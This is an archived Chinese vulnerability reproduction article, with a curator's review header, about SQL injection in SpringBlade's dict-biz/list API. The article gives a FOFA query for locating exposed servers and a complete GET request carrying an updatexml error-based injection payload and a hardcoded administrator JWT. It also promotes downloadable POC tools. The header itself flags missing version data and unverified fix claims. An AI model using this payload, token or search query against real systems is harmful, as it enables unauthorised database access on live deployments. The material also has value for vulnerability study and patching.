---
source: "gelusus/wxvl 公众号漏洞文库"
product: "SpringBlade/dict-biz/list"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "SpringBlade dict-biz-list接口存在SQL注入漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：仅产品名，无版本/修复范围；提供管理员声明JWT，但没有说明有效登录或硬编码密钥伪造前提"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-2523a7e82ab11db8faaf36c0"
entity_id: "ve-2523a7e82ab11db8faaf36c0"
schema_version: "1"
---

## 核对与使用边界


本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：仅产品名，无版本/修复范围；提供管理员声明JWT，但没有说明有效登录或硬编码密钥伪造前提

代码与实验材料：完整参数名updatexml(md5(1))请求及结果图，JWT为HS512、无Bearer前缀；工具下载需公众号

来源证据范围：转载/语雀来源可追溯，未给对应官方修复提交或完整权限模型

- **适用与权限边界（1）**：权限前提和版本缺失；依据：完整管理员JWT不等于无认证，未说明签名密钥是否默认；SpringBoot2.5/2.7与Cloud2020/2021产品介绍相冲突。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **事实待核（2）**：官方已修复说法不够具体；依据：只链接blade-tool项目，没有版本/commit；CVE/CNNVD/CNVD栏全空。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  SpringBlade dict-biz/list接口存在SQL注入漏洞   
南风徐来  南风漏洞复现文库   2024-04-19 23:19  
  
免责声明：  
请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。  
该文章仅供学习用途使用。  
## 1. SpringBlade简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.5 、Spring Cloud 2020 等核心技术构建，完全遵循阿里巴巴编码规范。  
## 2.漏洞描述  
  
SpringBlade 是一个由商业级项目升级优化而来的微服务架构 采用Spring Boot 2.7 、Spring Cloud 2021 等核心技术 构建，完全遵循阿里巴巴编码规范。提供基于React和Vue的两个前端框架用于快速搭建企业级的SaaS多租户微服务平台。SpringBlade list接口存在SQL注入漏洞。  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
SpringBlade  
  
![](../../.resource/remote/df4b6e37d42dd3909d2b07b9d3fe6cb4b201aa9e70907e48f852051ce7d3104f.jpg "null")  
  
SpringBlade list接口存在SQL注入漏洞  
## 4.fofa查询语句  
  
body="https://bladex.vip"||body="Saber 将不能正常工作"  
## 5.漏洞复现  
  
漏洞链接：https://127.0.0.1/api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1  
  
漏洞数据包：  
```
GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,md5(1),0x7e),1)=1 HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: 127.0.0.1
Blade-Auth: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJpc3MiOiJpc3N1c2VyIiwiYXVkIjoiYXVkaWVuY2UiLCJ0ZW5hbnRfaWQiOiIwMDAwMDAiLCJyb2xlX25hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl9pZCI6IjExMjM1OTg4MjE3Mzg2NzUyMDEiLCJyb2xlX2lkIjoiMTEyMzU5ODgxNjczODY3NTIwMSIsInVzZXJfbmFtZSI6ImFkbWluIiwib2F1dGhfaWQiOiIiLCJ0b2tlbl90eXBlIjoiYWNjZXNzX3Rva2VuIiwiZGVwdF9pZCI6IjExMjM1OTg4MTM3Mzg2NzUyMDEiLCJhY2NvdW50IjoiYWRtaW4iLCJjbGllbnRfaWQiOiJzd29yZCIsImV4cCI6MTc5MTU3MzkyMiwibmJmIjoxNjkxNTcwMzIyfQ.wxB9etQp2DUL5d3-VkChwDCV3Kp-qxjvhIF_aD_beF_KLwUHV7ROuQeroayRCPWgOcmjsOVq6FWdvvyhlz9j7A
Accept-Language: zh-CN,zh;q=0.9
```  
  
![](../../.resource/remote/f549a3ff4bc1dd5cec5eda77e1f0df34761eb64c2f305abb7af942762c974626.jpg "null")  
  
![](../../.resource/remote/f882892fbaa7640c33d4d8018a8c894d691d4b87258fef202918776e02257dd7.jpg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现126 即可获得该POC工具下载地址：  
  
![](../../.resource/remote/e69cc266a2dc94a68915c95535490ddf98f1abb6feee8952eb804f6d4cfefeaf.jpg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。  
  
![](../../.resource/remote/35500e3984c9d7e98b9e6768f9bb2b331443aa68a75c1dc188271d33128fed38.jpg "null")  
  
![](../../.resource/remote/5d6a45f25899215706838d7d66ec7f80816d533f1878d3f33dd73027bef1b971.jpg "null")  
  
![](../../.resource/remote/31d277a6fa41aea2b7fd0d593be57026d58b7876987c18d87a59ee8ba08134b9.jpg "null")  
  
![](../../.resource/remote/65011a35c2836fc5571df8cee7426ebc5a17f6ba9ca67b14d3c7d9f48aadbf2f.jpg "null")  
  
![](../../.resource/remote/0370ece5ce7c33e3ba3ecf6ac87537032b0463d5e5afdc00f069b451547c6fb8.jpg "null")  
## 7.整改意见  
  
⼚商已发布了漏洞修复程序 请及时关注更新：https://github.com/chillzhuang/blade-tool  
## 8.往期回顾  
  
[用友NC Cloud doPost接口存在任意文件上传漏洞2](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486235&idx=1&sn=797e70d49305df0d175e890a846fa980&chksm=974b861ca03c0f0a18fafe8c60be12bd3e94f2e20627a6bf41b0781c159183934cdb80b2f0ef&scene=21#wechat_redirect)  
  
  
[泛微e-office系统ajax.php接口存在任意文件上传漏洞](http://mp.weixin.qq.com/s?__biz=MzIxMjEzMDkyMA==&mid=2247486198&idx=1&sn=971121723b24414642a6efd672c22ecc&chksm=974b87f1a03c0ee7675fb34a06913c10ca977fd6f9a1158a1bd19af1641fe16ffb2d6ec86e65&scene=21#wechat_redirect)  
  
  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
